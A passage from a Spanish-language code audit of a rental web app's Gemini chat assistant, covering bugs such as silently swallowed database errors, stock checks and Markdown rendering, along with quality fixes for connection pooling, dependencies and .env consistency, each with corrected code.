Cero usos en código, cero menciones en la documentación. Ni `python-ia/main.py` ni `backend/services/iaService.js` la leen, y no hay ninguna dependencia de Groq instalada (`python-ia/requirements.txt` no la incluye; `backend/package.json` tampoco).

**Descripción**
La variable, con el comentario "Fallback (opcional por ahora)" y el valor literal `opcional`, describe una arquitectura de respaldo que no existe. El único camino de error ante un fallo de Gemini es `python-ia/main.py:293-295`: un `raise HTTPException(status_code=502, …)`. No hay reintento, ni proveedor alternativo, ni respuesta degradada.

Es deuda técnica de la peor clase: la que hace creer que un riesgo está mitigado cuando no lo está. El valor `opcional`/`opcional_por_ahora` agrava el problema, porque es una cadena no vacía: si alguien escribiera más adelante `if os.getenv("GROQ_API_KEY"):`, la condición sería verdadera y el código intentaría autenticarse en Groq con la clave literal `"opcional"`.

**Escenario concreto donde falla**
En la presentación, alguien del público pregunta: *"¿y si la API de Google se cae o se agota la cuota?"*. El equipo abre el `.env`, ve `GROQ_API_KEY` con el comentario "Fallback" y responde que hay un proveedor de respaldo. Es incorrecto: si Gemini falla, el cliente recibe un 502 y el chat muestra un error (el de SEC-03). Afirmar una capacidad que no existe delante de un evaluador es el daño real de este hallazgo.

El segundo escenario es futuro: un desarrollador implementa el fallback asumiendo que la clave ya está provisionada (porque la variable existe en ambos `.env`), lo despliega, y el respaldo falla en su primera activación real —justo cuando más se necesita— con un error de autenticación de Groq imposible de anticipar en pruebas, porque en pruebas Gemini nunca falla.

**Corrección propuesta**

**Opción recomendada (la que se propone aplicar): eliminar la variable.** Es el cambio honesto y de coste cero. Borrar `python-ia/.env:12-13` y `backend/.env:17`. El contenido final de ambos archivos está en **CAL-03**.

Y dejar constancia del comportamiento real en `python-ia/README.md`, añadiendo tras la sección de endpoints:

```markdown
## Comportamiento ante fallos de Gemini

No hay proveedor de respaldo. Si la API de Gemini falla (cuota agotada, clave
inválida, timeout), `POST /chat` responde `502` y el backend Node devuelve al
cliente un mensaje genérico. El incidente queda registrado en el log del
microservicio con un id de correlación y en `conversaciones_ia` con
`estado = 'error'`.
```

**Opción alternativa, si se quiere el fallback de verdad:** implementarlo sí está dentro de OPCIÓN 1 (sigue siendo un LLM externo consultado por prompt, sin entrenamiento ni embeddings). Sería: añadir `groq` a `requirements.txt`, leer la clave, y en el `except` de `main.py:293` intentar el proveedor secundario antes de lanzar el 502, registrando en `conversaciones_ia` qué proveedor respondió. Es trabajo de esfuerzo **medio** y no debe hacerse antes de la presentación. Lo que **no** debe quedarse es el estado actual: la variable sin implementación.

---

### BUG-07 — Un fallo de base de datos degrada el asistente en silencio y le hace dar información falsa al cliente
**Severidad: MEDIO**

**Archivos y líneas**
- `python-ia/main.py:163-171` — el manejo de errores de `obtener_contexto`:
  - `:163-164` — `except HTTPException: raise` (correcto).
  - `:165-166` — `except Exception as error: print(f"⚠️ Error obteniendo contexto de BD: {error}")` — traga cualquier otro fallo.
  - `:171` — `return contexto` — devuelve el diccionario vacío inicializado en `:115-119`.
- `python-ia/main.py:186-190` — el prompt sustituye la lista vacía por el literal `"  (No hay productos disponibles en este momento)"`.
- `python-ia/main.py:262` — `contexto = obtener_contexto(request.usuario_id)`: el llamante no tiene forma de saber si el contexto es real o degradado.
- `python-ia/main.py:207-209` — la instrucción del prompt: *"Si el cliente pregunta por productos que no están en la lista de disponibles, indícalo con claridad en vez de inventar información"*.

**Descripción**
`obtener_contexto` captura toda excepción que no sea `HTTPException` y devuelve un contexto vacío sin señalizarlo. El único rastro es un `print` en el `stdout` del proceso. Desde el punto de vista del endpoint, un contexto vacío y un catálogo realmente vacío son indistinguibles.

Y aquí está lo grave: el prompt le **ordena** al modelo tratar la lista vacía como la verdad ("indícalo con claridad en vez de inventar información"). El modelo cumple la instrucción correctamente. El resultado es un asistente que afirma con seguridad algo falso, y la petición devuelve `200 OK`, así que ninguna monitorización basada en códigos de estado lo detecta.

El mismo patrón afecta a los alquileres del cliente (`:180-184` → `"  (Sin alquileres previos)"`): un cliente con 3 alquileres puede oír que no tiene ninguno.

**Escenario concreto donde falla**
Se cambia la contraseña de PostgreSQL y se actualiza `backend/.env` pero se olvida `python-ia/.env` (dos archivos con la misma credencial duplicada, ver CAL-03). El backend Node sigue funcionando perfectamente: el catálogo se ve, el carrito funciona, los alquileres se crean. Pero el microservicio de IA no puede conectar: `conectar_db()` lanza `OperationalError`, se traga en `:165-166`, y `obtener_contexto` devuelve `{"usuario": None, "ultimos_alquileres": [], "productos_disponibles": []}`.

Un cliente abre el chat y pregunta *"¿tienen copas de champagne para una boda de 100 personas?"*. El asistente responde, con total naturalidad:

> «Lamentablemente en este momento no tenemos productos disponibles para alquilar. Te sugiero consultar más adelante.»

El cliente se va a la competencia. La empresa tiene 180 copas flauta en stock (`database/schema.sql:220`). El sistema devolvió `200 OK`, el chat "funcionó", la conversación se guardó en `conversaciones_ia` con `estado = 'completada'` (BUG-04), y el único indicio del problema es una línea con un emoji en una consola que probablemente nadie está mirando.

**Corrección propuesta**

Distinguir el fallo de infraestructura del catálogo genuinamente vacío, y fallar de forma visible en el primer caso. Reemplazar `python-ia/main.py:110-171` completo:

```python
def obtener_contexto(usuario_id: int) -> Dict[str, Any]:
    """
    Consulta en PostgreSQL los datos necesarios para darle contexto a Gemini:
    datos del usuario, sus ultimos alquileres y los productos disponibles.

    Si la base de datos no esta accesible se lanza 503 en lugar de devolver un
    contexto vacio: con el catalogo vacio el prompt le indica al modelo que no hay
    stock, y el modelo se lo afirma al cliente como si fuera cierto.
    """
    contexto: Dict[str, Any] = {
        "usuario": None,
        "ultimos_alquileres": [],
        "productos_disponibles": [],
    }

    conn = None
    try:
        conn = conectar_db()
        with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
            # Datos del usuario
            cur.execute(
                "SELECT id, nombre, correo, rol FROM usuarios WHERE id = %s",
                (usuario_id,),
            )
            usuario = cur.fetchone()
            if usuario is None:
                # No se devuelve 404: distinguir "existe / no existe" permite enumerar
                # cuentas (ver SEC-04). Se continua con contexto anonimo.
                print(f"Contexto sin usuario: usuario_id={usuario_id} no existe en BD")
            else:
                contexto["usuario"] = dict(usuario)

            # Ultimos alquileres del usuario
            cur.execute(
                """
                SELECT id, fecha_entrega, fecha_recojo, direccion_evento,
                       total, estado
                FROM alquileres
                WHERE cliente_id = %s
                ORDER BY created_at DESC
                LIMIT 3
                """,
                (usuario_id,),
            )
            contexto["ultimos_alquileres"] = [dict(fila) for fila in cur.fetchall()]

            # Productos disponibles (con stock activo)
            cur.execute(
                """
                SELECT p.nombre, c.nombre AS categoria, p.precio_unidad,
                       (p.stock_total - p.stock_baja) AS stock_disponible
                FROM productos p
                JOIN categorias c ON c.id = p.categoria_id
                WHERE p.activo = TRUE AND (p.stock_total - p.stock_baja) > 0
                ORDER BY p.nombre
                LIMIT 15
                """
            )
            contexto["productos_disponibles"] = [dict(fila) for fila in cur.fetchall()]

    except psycopg2.Error as error:
        # Fallo de infraestructura: mejor un error explicito que una respuesta
        # segura de si misma y equivocada.
        print(f"Error de PostgreSQL obteniendo contexto (usuario_id={usuario_id}): {error!r}")
        raise HTTPException(
            status_code=503,
            detail="El asistente no puede consultar el catalogo en este momento",
        )
    finally:
        if conn is not None:
            conn.close()

    return contexto
```

Cambios respecto al original: se elimina el `raise HTTPException(404)` (SEC-04), se captura `psycopg2.Error` en lugar de `Exception` y se convierte en `503` en vez de tragarlo. Ya no hace falta el `except HTTPException: raise` de `:163-164`, porque el único `HTTPException` que se lanza aquí es el nuevo 503 y se lanza fuera del `try` de negocio.

Con esto, `backend/services/iaService.js:46-51` recibe un 503 y (con SEC-03 aplicado) le devuelve al cliente *"El asistente no está disponible en este momento"* — que es cierto — en lugar de una afirmación falsa sobre el stock.

---

### BUG-08 — `clearChat()` genera una clase CSS que no existe y el mensaje sale sin estilo
**Severidad: BAJO**

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:187` — `messageDiv.className = \`chat-message ${tipo}-message\`;` (el sufijo `-message` se añade siempre).
- `backend/frontend/assets/js/chatwidget.js:306-309` — `clearChat()` pasa `'bot-message'` como `tipo` → la clase resultante es `chat-message bot-message-message`.
- `backend/frontend/assets/js/chatwidget.js:209` — `if (tipo === 'bot-message' || tipo === 'bot-error')`.
- `backend/frontend/assets/css/styles-chat-recommendations.css:102` — `.chat-message.bot-message { … }`
- `backend/frontend/assets/css/styles-chat-recommendations.css:109` — `.chat-message.bot-error-message { … }`
- `backend/frontend/assets/css/styles-chat-recommendations.css:96` — `.chat-message.user-message { … }`

**Descripción**
La convención de `addMessage` es recibir el tipo **sin** el sufijo (`'user'`, `'bot'`, `'bot-error'`) porque la línea 187 lo añade. Las llamadas de `sendMessage` la respetan: `'user'` (`:125`) y `'bot'` (`:158`) producen `user-message` y `bot-message`, que existen en el CSS. Pero hay dos sitios que la rompen:

1. **`clearChat()` (`:306-309`) pasa `'bot-message'`**, produciendo `bot-message-message`. Esa clase no existe en el CSS, así que el mensaje "¡Conversación limpiada!" se renderiza con los estilos de `.chat-message` (`:84`) pero sin el color de fondo, la alineación ni el borde del bot: aparece visualmente roto respecto al resto de la conversación.
2. **La condición de `:209` nunca es verdadera para las respuestas del bot.** Compara `tipo === 'bot-message'`, pero `sendMessage` pasa `'bot'`. Es decir, `playNotificationSound()` no se llamaría nunca para una respuesta del asistente. Hoy es inocuo porque el método está enteramente comentado (`:282-286`), pero es una bomba de relojería: quien descomente el audio descubrirá que no suena para las respuestas —solo para los errores— y perderá tiempo buscando la causa en el `Audio`.

**Escenario concreto donde falla**
Un cliente pulsa "limpiar conversación" (o se llama a `window.chatWidget.clearChat()` desde consola, que es la única vía hoy, ya que no hay botón). El historial se borra correctamente, pero el mensaje de confirmación aparece sin la burbuja gris del asistente: texto suelto, alineado según los estilos por defecto de `.chat-message`, visualmente distinto de todos los mensajes anteriores. En una presentación parece un error de renderizado.

**Corrección propuesta**

Reemplazar `backend/frontend/assets/js/chatwidget.js:306-309`:

```javascript
        this.addMessage(
            '¡Conversación limpiada! Estoy listo para ayudarte de nuevo. 🎉',
            'bot'
        );
```

Y reemplazar `backend/frontend/assets/js/chatwidget.js:209`:

```javascript
        // addMessage recibe el tipo sin el sufijo '-message' (lo anade la linea 187):
        // sendMessage pasa 'bot' y 'bot-error', no 'bot-message'.
        if (tipo === 'bot' || tipo === 'bot-error') {
```

---

### BUG-09 — Las cantidades recomendadas pueden superar el stock y el pedido muere en el pago
**Severidad: BAJO**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:238` — `const cantidad = Math.max(1, parseInt(item.cantidad) || 1);` — se toma la cantidad del modelo sin compararla con el stock.
- `backend/frontend/assets/js/recommendationcards.js:340` — la tarjeta solo deshabilita el botón si el stock es **cero**: `${recomendacion.stock_disponible > 0 ? '' : 'disabled'}`.
- `backend/frontend/assets/js/recommendationcards.js:443-449` — `updateQuantity` solo aplica un mínimo (`Math.max(1, …)`), sin máximo.
- `backend/frontend/assets/js/recommendationcards.js:417-420` — el `<input type="number" min="1">` del resumen no lleva `max`.
- `backend/frontend/assets/js/recommendationcards.js:495-497` — se vuelca al carrito tal cual.
- (Contraste) `backend/controllers/alquileresController.js:41` — el servidor **sí** valida: `return res.status(400).json({ error: \`Stock insuficiente para producto ID ${item.producto_id}\` });`

**Descripción**
No es un agujero de seguridad: el servidor valida el stock antes de crear el alquiler (`alquileresController.js:6-9` calcula la disponibilidad y `:41` rechaza), así que no se puede sobrevender. Es un callejón sin salida de producto: la interfaz deja construir una propuesta que el backend rechazará, y el rechazo llega en el último paso.

El dato de stock está disponible en el cliente (`stock_disponible` viaja en cada recomendación, `:249`, y se muestra en la tarjeta, `:330-332`), así que la comprobación se puede hacer en el momento de recomendar en lugar de en el momento de pagar.

**Escenario concreto donde falla**
Un cliente pide recomendaciones para «boda / 300 asistentes». Gemini, razonablemente, propone 300 unidades de `Mantel Dorado Satinado`, cuyo stock real es 40 (`database/schema.sql:245`). La tarjeta muestra a la vez "Cantidad sugerida: 300 unidades" y "Stock Disponible: 40" —una contradicción que el propio componente no detecta— con el botón "Agregar" activo, porque 40 > 0. El cliente añade los 6 productos, ve un total de varios miles de soles, pulsa "Confirmar Selección", va al carrito, rellena dirección, fechas y método de pago, y al confirmar recibe:

> `400 Stock insuficiente para producto ID 17`

Sin saber qué producto es el ID 17, ni cuánto debería pedir en su lugar. Tiene que volver atrás y descubrirlo por prueba y error.

**Corrección propuesta**

Topar la cantidad al stock disponible en el momento de resolver contra el catálogo, y avisarlo en la tarjeta. En `resolverContraCatalogo`, reemplazar `recommendationcards.js:238-252` (partiendo de la versión ya modificada por BUG-03):

```javascript
            const stockDisponible = Number(producto.stock_disponible) || 0;
            const cantidadSugerida = Math.max(1, parseInt(item.cantidad) || 1);
            // El servidor rechaza el alquiler si se pide mas stock del disponible
            // (controllers/alquileresController.js:41). Mejor topar aqui y avisarlo
            // que dejar al cliente descubrirlo al confirmar el pago.
            const cantidad = stockDisponible > 0
                ? Math.min(cantidadSugerida, stockDisponible)
                : cantidadSugerida;
            const precio_unidad = parseFloat(producto.precio_unidad);

            resueltos.push({
                id: producto.id,
                nombre: producto.nombre,
                categoria: producto.categoria,
                tier: this.clasificarPorPrecio(precio_unidad, min, max),
                descripcion: item.motivo || producto.descripcion || '',
                cantidad,
                cantidadSugerida,
                limitadoPorStock: cantidad < cantidadSugerida,
                precio_unidad,
                stock_disponible: stockDisponible,
                subtotal: precio_unidad * cantidad,
                imagen: producto.foto_url
            });
```

Mostrar el aviso en la tarjeta. En `createRecommendationCard`, reemplazar el bloque `detail-row` de la cantidad (`recommendationcards.js:320-323`):

```javascript
                <div class="detail-row">
                    <strong>Cantidad sugerida:</strong>
                    <span>${recomendacion.cantidad} unidades${
                        recomendacion.limitadoPorStock
                            ? ` <em title="La IA sugirió ${recomendacion.cantidadSugerida}, pero solo hay ${recomendacion.stock_disponible} disponibles">(ajustado al stock)</em>`
                            : ''
                    }</span>
                </div>
```

Y poner un tope también en la edición manual del resumen. Reemplazar `recommendationcards.js:417-420`:

```javascript
                                    <input type="number"
                                           value="${prod.cantidad}"
                                           min="1"
                                           max="${prod.stock_disponible}"
                                           onchange="window.recommendationCards.updateQuantity(${prod.id}, this.value)">
```

Y `recommendationcards.js:443-449`:

```javascript
    updateQuantity(productoId, nuevaCantidad) {
        const producto = this.selectedProducts.find(p => p.id === productoId);
        if (producto) {
            const pedida = Math.max(1, parseInt(nuevaCantidad) || 1);
            // Tope en el stock disponible: el servidor rechazaria el alquiler igualmente.
            const tope = Number(producto.stock_disponible) || pedida;
            producto.cantidad = Math.min(pedida, tope);
            if (producto.cantidad < pedida) {
                this.showErrorMessage(
                    `Solo hay ${tope} unidades disponibles de "${producto.nombre}"`
                );
            }
            this.updateSummary();
        }
    }
```

---

### BUG-10 — `sanitizeHTML` interpreta `__texto__` como cursiva cuando en Markdown es negrita
**Severidad: BAJO** *(cosmético)*

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:249-256` — el método completo.
- `:254` — `.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')` — correcto.
- `:255` — `.replace(/__(.*?)__/g, '<em>$1</em>')` — invertido: en Markdown `__texto__` es **negrita** (equivalente a `**texto**`) y `_texto_` es *cursiva*.

**Descripción**
El escapado en sí es correcto: la línea 251 mete el contenido en `div.textContent` y lee `div.innerHTML`, así que todo el HTML del modelo queda neutralizado antes de aplicar el formato (este componente **no** tiene el problema de SEC-06). El defecto es solo de interpretación de Markdown:

1. `__texto__` se renderiza en cursiva en lugar de negrita.
2. `_texto_` (la sintaxis real de cursiva, la más habitual) no se procesa: se muestran los guiones bajos literales.
3. Si el modelo deja un `**` sin cerrar —frecuente cuando la respuesta se trunca— el regex no casa y se ven los asteriscos crudos en el chat.

Gemini usa Markdown de forma natural en sus respuestas, así que los tres casos se ven en uso normal.

**Escenario concreto donde falla**
El asistente responde: `Para 100 personas necesitas __120 copas__ (10% de margen) y _al menos_ 2 manteles`. El cliente ve *120 copas* en cursiva (cuando el modelo quería enfatizarlo en negrita) y `_al menos_` con los guiones bajos visibles, como si el sistema estuviera mostrando texto sin procesar. Da una impresión de acabado descuidado en la parte más visible del producto.

**Corrección propuesta**

Reemplazar `backend/frontend/assets/js/chatwidget.js:249-256`:

```javascript
    /**
     * Escapa el HTML del contenido (via textContent) y luego aplica un subconjunto
     * de Markdown. El orden importa: ** y __ (negrita) antes de * y _ (cursiva),
     * para que los delimitadores dobles no los consuma la regla simple.
     */
    sanitizeHTML(html) {
        const div = document.createElement('div');
        div.textContent = html;
        return div.innerHTML
            .replace(/\n/g, '<br>')
            .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
            .replace(/__(.+?)__/g, '<strong>$1</strong>')
            .replace(/(^|[\s(])\*(?!\s)(.+?)\*/g, '$1<em>$2</em>')
            .replace(/(^|[\s(])_(?!\s)(.+?)_/g, '$1<em>$2</em>');
    }
```

Notas: `__` pasa a `<strong>` (corrige la inversión), se añade el soporte de `*`/`_` simples para cursiva, y las reglas de cursiva exigen que el delimitador vaya precedido de inicio de cadena, espacio o paréntesis y no seguido de espacio — así `snake_case_asi` o una URL con guiones bajos no se convierten en cursiva por accidente. Se usa `.+?` en lugar de `.*?` para no casar delimitadores vacíos (`****`).

---

## 4. Mejoras de calidad de código (sin cambiar funcionalidad)

### CAL-01 — El microservicio abre y cierra una conexión a PostgreSQL en cada operación (dos por petición)
**Esfuerzo: medio**

**Archivos y líneas**
- `python-ia/main.py:99-107` — `conectar_db()` hace `psycopg2.connect(...)` en crudo cada vez que se la llama.
- `python-ia/main.py:123` — primera llamada por petición, en `obtener_contexto`.
- `python-ia/main.py:169` — `conn.close()`.
- `python-ia/main.py:218` — segunda llamada por petición, en `guardar_conversacion`.
- `python-ia/main.py:234` — `conn.close()`.
- (Contraste) `backend/config/db.js:10-17` — el backend Node **sí** usa `new Pool({...})`, con `connectionTimeoutMillis` y manejador de errores de cliente inactivo (`:28-30`). El microservicio es el único componente sin pool.

**Descripción**
Cada `POST /chat` establece **dos** conexiones TCP completas a PostgreSQL, cada una con su *handshake* y su autenticación (`scram-sha-256` por defecto, que implica varias rondas), y las cierra inmediatamente. El coste por conexión en local ronda los 5-20 ms, y sube notablemente si la base de datos está en otra máquina. No es el cuello de botella hoy (Gemini tarda 20-50 s, según `recommendationcards.js:272`), pero sí importa por dos razones que no dependen de la latencia:

1. **Agotamiento de conexiones.** `max_connections` en PostgreSQL es 100 por defecto, y el backend Node ya consume parte de ese presupuesto con su propio pool. Un pico de peticiones concurrentes al microservicio —o el bucle de un atacante aprovechando SEC-01— puede agotar los slots y tumbar el acceso a la base de datos **de toda la aplicación**, no solo del chat.
2. **Consistencia con el resto del proyecto.** Que el único componente sin pool sea el nuevo es precisamente el tipo de divergencia que conviene cerrar mientras el código es pequeño.

Además, el patrón `conn = None / try / finally: if conn is not None: conn.close()` se repite literalmente en las dos funciones (`:121-169` y `:217-234`), con la gestión manual del `commit` en una de ellas.

**Cambio propuesto**

Un `ThreadedConnectionPool` (FastAPI ejecuta los endpoints `def` síncronos en un *threadpool*, así que la variante *threaded* es la correcta) más un *context manager* que centralice la devolución de la conexión al pool, el `commit` y el `rollback`.

Añadir los imports (junto a los de `python-ia/main.py:7-10` y `:17-24`):

```python
from contextlib import contextmanager
from typing import Any, Dict, Iterator, List, Optional
```

```python
import psycopg2
import psycopg2.extras
import psycopg2.pool
```

Reemplazar `python-ia/main.py:99-107` por:

```python
# Pool de conexiones: antes se abria y cerraba una conexion TCP + autenticacion en
# cada operacion (dos por peticion de chat). Con el pool se reutilizan, y ademas se
# acota cuantas conexiones puede consumir este servicio del presupuesto de
# max_connections de PostgreSQL, que comparte con el backend Node.
DB_POOL_MIN = int(os.getenv("DB_POOL_MIN", "1"))
DB_POOL_MAX = int(os.getenv("DB_POOL_MAX", "5"))

try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=DB_POOL_MIN,
        maxconn=DB_POOL_MAX,
        host=DB_HOST,
        port=DB_PORT,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
        connect_timeout=10,
    )
    print(f"Pool de PostgreSQL creado ({DB_POOL_MIN}-{DB_POOL_MAX} conexiones)")
except psycopg2.Error as error:
    raise RuntimeError(f"No se pudo crear el pool de PostgreSQL: {error}") from error


@contextmanager
def obtener_conexion(commit: bool = False) -> Iterator[Any]:
    """
    Toma una conexion del pool y la devuelve siempre, tambien si hay excepcion.
    Con commit=True confirma la transaccion al salir sin error, y hace rollback si
    lo hay, para que la conexion no vuelva al pool con una transaccion abierta.
    """
    conn = db_pool.getconn()
    try:
        yield conn
        if commit:
            conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        db_pool.putconn(conn)
```

Usarlo en `obtener_contexto`: sustituir `python-ia/main.py:121-124` por

```python
    try:
        with obtener_conexion() as conn, conn.cursor(
            cursor_factory=psycopg2.extras.RealDictCursor
        ) as cur:
```

y eliminar el bloque `finally: if conn is not None: conn.close()` (`:167-169`), ya que el *context manager* se encarga.

En `guardar_conversacion`, sustituir `python-ia/main.py:216-228` por:

```python
    try:
        with obtener_conexion(commit=True) as conn, conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO conversaciones_ia
                    (usuario_id, mensaje_usuario, respuesta_ia, tokens_usados, estado)
                VALUES (%s, %s, %s, %s, %s)
                """,
                (usuario_id, mensaje, respuesta or "", tokens, estado),
            )
        print(f"Conversacion guardada (estado={estado}) para usuario_id={usuario_id}")
```

y eliminar igualmente su `finally` (`:232-234`).

Por último, cerrar el pool al apagar el servicio. Añadir junto a los endpoints:

```python
@app.on_event("shutdown")
def cerrar_pool() -> None:
    """Cierra todas las conexiones del pool al detener el servicio."""
    db_pool.closeall()
    print("Pool de PostgreSQL cerrado")
```

**Nota de compatibilidad:** `@app.on_event("shutdown")` está obsoleto en FastAPI moderno, pero es la API correcta para la versión pinada en `requirements.txt:1` (`fastapi==0.104.1`). Si en el futuro se actualiza FastAPI, migrar a un `lifespan`.

**Interacción con otros hallazgos:** este cambio toca las mismas líneas que BUG-04 (firma de `guardar_conversacion`) y BUG-07 (manejo de errores de `obtener_contexto`). Conviene aplicar los tres en una sola pasada sobre `main.py` para no reescribir el mismo bloque tres veces.

---

### CAL-02 — `httpx` está pinado en `requirements.txt` y no se usa
**Esfuerzo: bajo**

**Archivos y líneas**
- `python-ia/requirements.txt:7` — `httpx==0.25.2` (última línea, además sin salto de línea final).

**Verificación**
```
$ grep -rn "httpx" python-ia/main.py
(sin resultados)
```

Ninguna importación en el único archivo de código del microservicio. Es un resto de la intención original de llamar a un segundo proveedor por HTTP (el mismo origen que `GROQ_API_KEY`, ver BUG-06): `google-generativeai` no lo necesita, ya que trae su propio transporte a través de `google-api-core`.

**Descripción**
Una dependencia declarada y no usada tiene tres costes concretos, ninguno dramático pero todos evitables:

1. **Es una dependencia que hay que mantener y auditar.** `httpx==0.25.2` es una versión fija de finales de 2023: cualquier aviso de seguridad sobre ella aparecerá en los escaneos del proyecto y habrá que evaluarlo, para una librería que no se ejecuta.
2. **Confunde sobre la arquitectura.** Quien lea `requirements.txt` asumirá que el microservicio hace llamadas HTTP salientes a alguien más aparte de Gemini.
3. **Puede provocar un conflicto de resolución al actualizar.** Fijar `httpx` a una versión antigua restringe las versiones de otros paquetes que lo tengan como dependencia (por ejemplo, `fastapi[all]` o el `TestClient` de Starlette) si se añaden más adelante.

**Cambio propuesto**

Si **no** se va a implementar el fallback (la opción recomendada en BUG-06), eliminar la línea 7. Contenido completo de `python-ia/requirements.txt`:

```
fastapi==0.104.1
uvicorn==0.24.0
google-generativeai==0.8.5
psycopg2-binary==2.9.9
python-dotenv==1.0.0
pydantic==2.4.2
```

(con salto de línea final, que hoy falta).

Después, reconstruir el entorno para que el `venv` refleje el archivo:

```bash
cd python-ia
venv\Scripts\activate
pip uninstall -y httpx
pip install -r requirements.txt
```

**Si en el futuro se añaden pruebas**, `httpx` volverá a ser necesario porque el `TestClient` de Starlette lo usa. En ese caso el sitio correcto es un `requirements-dev.txt` separado, no el de producción:

```
# requirements-dev.txt
-r requirements.txt
pytest==7.4.3
httpx==0.25.2
```

---

### CAL-03 — Inconsistencia entre `backend/.env` y `python-ia/.env`: variables duplicadas, muertas y divergentes
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/.env:13` — `API_GEMINI_KEY=AQ.Ab8RN6L…` → **nunca se lee en Node**.
- `backend/.env:14` — `GEMINI_MODEL=gemini-1.5-flash` → **nunca se lee en Node**.
- `backend/.env:17` — `GROQ_API_KEY=opcional_por_ahora` → nunca se lee en ningún sitio (BUG-06).
- `python-ia/.env:10` — `GEMINI_MODEL=gemini-3.6-flash` → **este sí** es el valor efectivo (`python-ia/main.py:38`).
- `python-ia/main.py:38` — `GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-1.5-flash")` → un tercer valor, el de por defecto.
- `python-ia/README.md:43` — documenta `GEMINI_MODEL=gemini-3.6-flash`.
- `backend/.env:2-6` y `python-ia/.env:2-6` — las credenciales de base de datos duplicadas en los dos archivos.
- `backend/.env.example:1-11` — le faltan `PYTHON_IA_URL`, `RATE_LIMIT_IA` (e `IA_SERVICE_TOKEN`, `MENSAJE_IA_MAX_CHARS` si se aplican SEC-01 y BUG-02) e incluye una `API_GEMINI_KEY` que Node no usa.

**Verificación**
```
$ grep -rn "GEMINI\|API_GEMINI" --include=*.js --exclude-dir=node_modules backend/
(sin resultados)
```

**Descripción**
El problema de fondo es que **no está claro qué archivo es la fuente de verdad de qué variable**, y hoy hay tres valores distintos para el mismo concepto:

| Dónde | `GEMINI_MODEL` | ¿Se lee? |
|---|---|---|
| `backend/.env:14` | `gemini-1.5-flash` | ❌ nunca |
| `python-ia/.env:10` | `gemini-3.6-flash` | ✅ es el efectivo |
| `python-ia/main.py:38` (default) | `gemini-1.5-flash` | solo si falta en el `.env` |

Riesgos concretos:

1. **Cambios que no surten efecto.** Alguien quiere cambiar de modelo, encuentra `GEMINI_MODEL` en `backend/.env` (el archivo que se abre primero, porque es el del backend principal), lo edita, reinicia Node… y nada cambia, porque el valor efectivo está en el otro archivo. Es exactamente la clase de pérdida de tiempo que ocurre bajo presión, antes de una demo.
2. **Superficie de exposición duplicada para la clave de Gemini** (ver SEC-08).
3. **Dos copias de `DB_PASSWORD` que hay que actualizar a la vez.** Olvidar una es el escenario de BUG-07: Node sigue funcionando y el microservicio de IA queda ciego, dando información falsa al cliente.
4. **`.env.example` incompleto.** Quien clone el repositorio y copie el ejemplo obtendrá un `.env` sin `PYTHON_IA_URL` ni `RATE_LIMIT_IA`. El servidor arrancará (ambas tienen valor por defecto en el código: `iaService.js:5` y `rateLimitIA.js:7`), y el fallo aparecerá más tarde y en otro sitio.

**Cambio propuesto**

Regla de asignación: **cada variable vive en el `.env` del proceso que la lee.** Las credenciales de base de datos son la única duplicación legítima, porque ambos procesos conectan a PostgreSQL; se marca como tal con un comentario para que nadie olvide cambiar las dos.

Contenido completo propuesto de **`backend/.env`**:

```dotenv
PORT=3000

# --- Base de datos (DUPLICADO EN python-ia/.env: cambiar en ambos archivos) ---
DB_HOST=localhost
DB_PORT=5432
DB_NAME=menajeDB
DB_USER=postgres
DB_PASSWORD=<contrasena_no_trivial>

JWT_SECRET=<el valor actual de backend/.env: no se reproduce aqui para no filtrarlo>
JWT_EXPIRES_IN=8h
UPLOAD_DIR=uploads
CORS_ORIGIN=http://localhost:3000

# === VARIABLES PARA OPCION 1 (IA) ===
# La API_GEMINI_KEY y GEMINI_MODEL viven SOLO en python-ia/.env: Node nunca llama a
# Gemini directamente, solo al microservicio (services/iaService.js).
PYTHON_IA_URL=http://127.0.0.1:8000
# Debe coincidir exactamente con IA_SERVICE_TOKEN de python-ia/.env
IA_SERVICE_TOKEN=<generar_con_python_-c_import_secrets_print_secrets.token_hex_32>
# Peticiones de chat por minuto y por usuario (entero positivo)
RATE_LIMIT_IA=5
# Longitud maxima del mensaje de /api/ia/chat. El prompt de recomendaciones incluye
# el catalogo acotado a 40 productos (~4k caracteres), asi que 8000 deja margen.
MENSAJE_IA_MAX_CHARS=8000
```

Contenido completo propuesto de **`python-ia/.env`**:

```dotenv
# --- Base de datos (DUPLICADO EN backend/.env: cambiar en ambos archivos) ---
DB_HOST=localhost
DB_PORT=5432
DB_NAME=menajeDB
DB_USER=postgres
DB_PASSWORD=<contrasena_no_trivial>

# --- Gemini (fuente de verdad unica: el backend Node NO lee estas variables) ---
API_GEMINI_KEY=<clave_rotada_nueva>
GEMINI_MODEL=gemini-3.6-flash

# --- Servidor ---
# Solo loopback: el microservicio se consume unicamente desde el backend Node.
PYTHON_IA_HOST=127.0.0.1
PYTHON_IA_PORT=8000
# Debe coincidir exactamente con IA_SERVICE_TOKEN de backend/.env
IA_SERVICE_TOKEN=<el_mismo_valor_que_en_backend/.env>
# production (por defecto) deshabilita /docs, /redoc y /openapi.json
IA_ENV=production
```

Contenido completo propuesto de **`backend/.env.example`** (este sí va a git, sin valores reales):

```dotenv
PORT=3000

# --- Base de datos (los mismos valores deben ir en python-ia/.env) ---
DB_HOST=localhost
DB_PORT=5432
DB_NAME=menaje_db
DB_USER=postgres
DB_PASSWORD=tu_password

JWT_SECRET=cadena_larga_y_aleatoria_aqui
JWT_EXPIRES_IN=8h
UPLOAD_DIR=uploads
CORS_ORIGIN=http://localhost:3000

# === OPCION 1 (IA) ===
# La clave de Gemini NO va aqui: vive en python-ia/.env (Node no llama a Gemini).
PYTHON_IA_URL=http://127.0.0.1:8000
# Secreto compartido con python-ia/.env. Generar con:
#   python -c "import secrets; print(secrets.token_hex(32))"
IA_SERVICE_TOKEN=
RATE_LIMIT_IA=5
MENSAJE_IA_MAX_CHARS=8000
